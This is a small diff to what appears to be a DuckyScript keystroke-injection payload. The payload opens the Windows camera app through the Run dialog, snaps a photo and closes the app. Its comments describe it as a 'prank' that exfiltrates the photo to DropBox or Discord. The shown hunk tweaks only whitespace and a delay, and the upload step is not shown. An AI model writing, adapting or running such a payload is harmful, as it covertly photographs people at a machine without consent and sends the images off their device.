@@ -1,10 +1,10 @@
-REM	A prank that takes a photo from the camera application and exfiltrates it to DropBox or Discord
-REM	Please change the behavior to fit your needs
+REM A prank that takes a photo from the camera application and exfiltrates it to DropBox or Discord
+REM Please change the behavior to fit your needs
 
 GUI r
 DELAY 500
 STRINGLN microsoft.windows.camera:
-DELAY 1000
+DELAY 1500
 SPACE
 DELAY 500
 ALT F4
